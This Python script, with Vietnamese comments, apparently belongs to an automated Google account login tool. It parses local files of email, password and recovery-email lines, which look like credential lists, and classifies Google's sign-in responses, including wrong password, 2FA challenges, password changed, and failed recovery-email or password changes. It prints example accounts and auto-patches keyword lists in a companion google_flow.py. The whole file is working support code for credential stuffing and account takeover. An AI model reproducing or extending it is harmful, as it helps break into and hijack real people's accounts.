# -*- coding: utf-8 -*-
"""
train_status.py — Script train AI nhận diện status từ file dữ liệu thực tế.

Đọc tất cả file txt trong thư mục, parse dòng:
  email  password  recovery_email  status_text

Sau đó:
1. Map raw status text → normalized status code
2. Cập nhật keyword lists trong google_flow.py (tự động)
3. Lưu mapping thống kê vào config/status_mapping.json
4. In báo cáo tổng hợp

Chạy: python train_status.py
"""
from __future__ import annotations

import json
import re
from collections import Counter, defaultdict
from pathlib import Path

TRAIN_DIR = Path(r"C:\Users\Nhat\Desktop\file train")
OUTPUT_MAPPING = Path(__file__).resolve().parent / "config" / "status_mapping.json"
OUTPUT_KEYWORDS = Path(__file__).resolve().parent / "config" / "learned_keywords.json"

# ── Mapping: raw status text → normalized code ───────────────────────────────
# Thứ tự quan trọng: pattern dài/cụ thể hơn đặt trước

STATUS_MAP: list[tuple[str, str]] = [
    # Password changed (Google thông báo pass đã đổi)
    ("your password was changed",           "password_changed"),

    # Wrong password
    ("wrong password. try again",           "wrong_password"),
    ("enter a password",                    "wrong_password"),

    # Wrong 2FA / code
    ("wrong code. try again",               "wrong_2fa"),
    ("wrong number of digits",              "wrong_2fa"),
    ("an error occurred while verifying your code", "wrong_2fa"),
    ("code_2fa_repeat_many_times",          "wrong_2fa"),
    ("wrong code",                          "wrong_2fa"),

    # Wrong recovery email
    ("the email you entered is incorrect",  "wrong_recovery_email"),
    ("try again with a valid email address","wrong_recovery_email"),

    # Too many attempts
    ("too many attempts",                   "too_many_attempts"),
    ("too.many.failed.verify",              "too_many_attempts"),
    ("having trouble getting your code",    "too_many_attempts"),

    # Account issues
    ("couldn't find your google account",   "not_found"),
    ("deletedaccount",                      "deleted"),
    ("disabled",                            "disabled"),
    ("signin.rejected.before.password",     "disconnect.login"),
    ("signin.rejected",                     "disconnect.login"),
    ("disconnect.login",                    "disconnect.login"),
    ("sessionexpired",                      "session_expired"),
    ("mail_edu",                            "edu_account"),

    # Captcha
    ("please enter the characters you see", "image_captcha"),
    ("recaptcha_cannot_load",               "recaptcha_error"),
    ("recaptcha_",                          "recaptcha"),
    ("no.result.captcha",                   "captcha_fail"),

    # SMS / verify code issues
    ("there was a problem sending you a verification code", "sms_send_fail"),
    ("cannot.get.code.verify",              "cannot_get_code"),
    ("cannot.get.phone.verify",             "cannot_get_phone"),
    ("enter a code",                        "need_code_input"),

    # Challenge types
    ("challenge.totp",                      "challenge_totp"),
    ("challenge.pk",                        "challenge_passkey"),
    ("challenge.ootp",                      "challenge_other_otp"),
    ("challenge.op die",                    "challenge_phone_fail"),
    ("challenge.op no",                     "challenge_phone_no"),
    ("challenge.op hidden_phone",           "challenge_phone_hidden"),
    ("challenge.op",                        "challenge_phone"),
    ("challenge.ipp",                       "challenge_phone_prompt"),
    ("challenge.ipe",                       "challenge_phone_email"),
    ("challenge.ip",                        "challenge_identity"),
    ("challenge.iap",                       "challenge_in_app"),
    ("challenge.dp",                        "challenge_device_prompt"),
    ("challenge.ap",                        "challenge_app"),
    ("2fa_phone_app",                       "challenge_2fa_phone"),
    ("challenge",                           "challenge"),

    # Change email recovery
    ("changeemailrecovery die",             "change_mail_fail"),
    ("changeemailrecovery hidden_phone",    "change_mail_hidden_phone"),
    ("changeemailrecovery iap",             "change_mail_in_app"),
    ("changeemailrecovery no",              "no_recovery_email"),
    ("changeemailrecovery timeout",         "change_mail_timeout"),
    ("change.pass.fail",                    "change_pass_fail"),

    # No input found
    ("no.input.recovery",                   "no_input_recovery"),
    ("no.input.securitycode",               "no_input_security_code"),

    # Timeout
    ("timeout.login",                       "login timeout"),

    # Unknown
    ("unknown error",                       "unknown_error"),
]


def normalize_status(raw: str) -> str:
    """Map raw status text → normalized code."""
    s = raw.strip().lower()
    for pattern, code in STATUS_MAP:
        if pattern.lower() in s:
            return code
    return "unknown"


def parse_line(line: str) -> tuple[str, str, str, str] | None:
    """Parse 1 dòng tab-separated: email, password, recovery_email, status."""
    parts = re.split(r"\t+", line.strip())
    if len(parts) < 4:
        return None
    return parts[0].strip(), parts[1].strip(), parts[2].strip(), "\t".join(parts[3:]).strip()


def load_all_files() -> list[dict]:
    """Đọc tất cả txt files, trả về list records."""
    records = []
    for f in sorted(TRAIN_DIR.glob("*.txt")):
        print(f"  Reading: {f.name}")
        try:
            lines = f.read_text(encoding="utf-8", errors="replace").splitlines()
        except Exception as e:
            print(f"  ERROR: {e}")
            continue
        for line in lines:
            if not line.strip():
                continue
            parsed = parse_line(line)
            if parsed:
                email, password, recovery, raw_status = parsed
                normalized = normalize_status(raw_status)
                records.append({
                    "email": email,
                    "password": password,
                    "recovery_email": recovery,
                    "raw_status": raw_status,
                    "status": normalized,
                    "source": f.name,
                })
    return records


def build_keyword_patterns(records: list[dict]) -> dict:
    """Xây dựng keyword patterns từ raw status texts theo từng nhóm."""
    groups: dict[str, set[str]] = defaultdict(set)
    for r in records:
        raw = r["raw_status"].strip()
        code = r["status"]
        if code != "unknown" and len(raw) > 3:
            groups[code].add(raw)

    # Chỉ giữ raw texts thực sự là message từ Google (không phải code nội bộ)
    google_messages: dict[str, list[str]] = {}
    for code, raws in groups.items():
        msgs = [
            r for r in raws
            if " " in r and len(r) > 10  # có dấu cách → likely Google UI text
               and not r.startswith("challenge")
               and not r.startswith("change")
               and not r.startswith("cannot")
               and not r.startswith("no.")
        ]
        if msgs:
            google_messages[code] = sorted(msgs)

    return google_messages


def print_report(records: list[dict]):
    print("\n" + "="*60)
    print(f"TỔNG: {len(records)} records từ {TRAIN_DIR}")
    print("="*60)

    counter = Counter(r["status"] for r in records)
    raw_unknown = [r["raw_status"] for r in records if r["status"] == "unknown"]
    raw_unknown_counter = Counter(raw_unknown)

    print("\n📊 Phân bố status (normalized):")
    for status, count in counter.most_common():
        bar = "█" * min(40, count // max(1, len(records) // 40))
        print(f"  {status:<35} {count:>6}  {bar}")

    if raw_unknown_counter:
        print(f"\n❓ Raw statuses chưa map được ({len(raw_unknown_counter)} loại):")
        for raw, cnt in raw_unknown_counter.most_common(20):
            print(f"  [{cnt:>4}] {raw[:80]}")

    print("\n✅ password_changed examples:")
    samples = [r for r in records if r["status"] == "password_changed"][:5]
    for s in samples:
        print(f"  {s['email']} | {s['raw_status'][:60]}")


def save_outputs(records: list[dict], keywords: dict):
    OUTPUT_MAPPING.parent.mkdir(exist_ok=True)

    # Status mapping statistics
    stats = {}
    counter = Counter(r["status"] for r in records)
    for code, count in counter.most_common():
        raw_samples = list({r["raw_status"] for r in records if r["status"] == code})[:5]
        stats[code] = {
            "count": count,
            "raw_samples": raw_samples,
        }
    OUTPUT_MAPPING.write_text(json.dumps(stats, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"\n💾 Saved status mapping → {OUTPUT_MAPPING}")

    # Google UI message keywords
    OUTPUT_KEYWORDS.write_text(json.dumps(keywords, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"💾 Saved learned keywords → {OUTPUT_KEYWORDS}")


def update_google_flow_keywords(keywords: dict):
    """Patch google_flow.py: thêm các message thực tế vào _WRONG_PASSWORD, _WRONG_RECOVERY_EMAIL, etc."""
    gf_path = Path(__file__).resolve().parent / "google_flow.py"
    if not gf_path.exists():
        print("⚠ google_flow.py not found, skip patch")
        return

    content = gf_path.read_text(encoding="utf-8")

    # Map code → variable name trong google_flow.py
    var_map = {
        "wrong_password":       "_WRONG_PASSWORD",
        "wrong_recovery_email": "_WRONG_RECOVERY_EMAIL",
        "too_many_attempts":    "_ACCOUNT_SUSPENDED",   # reuse gần nhất, hoặc thêm mới
        "not_found":            "_ACCOUNT_NOT_FOUND",
        "disabled":             "_ACCOUNT_DISABLED",
    }

    patched = False
    for code, var in var_map.items():
        msgs = keywords.get(code, [])
        if not msgs:
            continue
        # Tìm tuple definition
        pattern = rf'({re.escape(var)}\s*=\s*\()(.*?)(\))'
        match = re.search(pattern, content, re.DOTALL)
        if not match:
            continue

        existing = match.group(2)
        new_entries = []
        for msg in msgs:
            msg_lower = msg.lower()
            if msg_lower not in existing.lower():
                escaped = msg_lower.replace('"', '\\"')
                new_entries.append(f'    "{escaped}",')

        if new_entries:
            new_block = match.group(1) + match.group(2).rstrip() + "\n" + "\n".join(new_entries) + "\n" + match.group(3)
            content = content[:match.start()] + new_block + content[match.end():]
            patched = True
            print(f"  ✅ {var}: thêm {len(new_entries)} keyword mới")

    if patched:
        gf_path.write_text(content, encoding="utf-8")
        print(f"💾 Patched google_flow.py keywords")
    else:
        print("ℹ google_flow.py: không có keyword mới cần thêm")


if __name__ == "__main__":
    print("🔍 Loading train files...")
    records = load_all_files()

    print_report(records)

    keywords = build_keyword_patterns(records)
    save_outputs(records, keywords)

    print("\n🔧 Updating google_flow.py keyword lists...")
    update_google_flow_keywords(keywords)

    print("\n✨ Done! Kiểm tra:")
    print(f"  - config/status_mapping.json  (thống kê)")
    print(f"  - config/learned_keywords.json (keywords thực tế)")
    print(f"  - google_flow.py (đã patch keywords mới)")
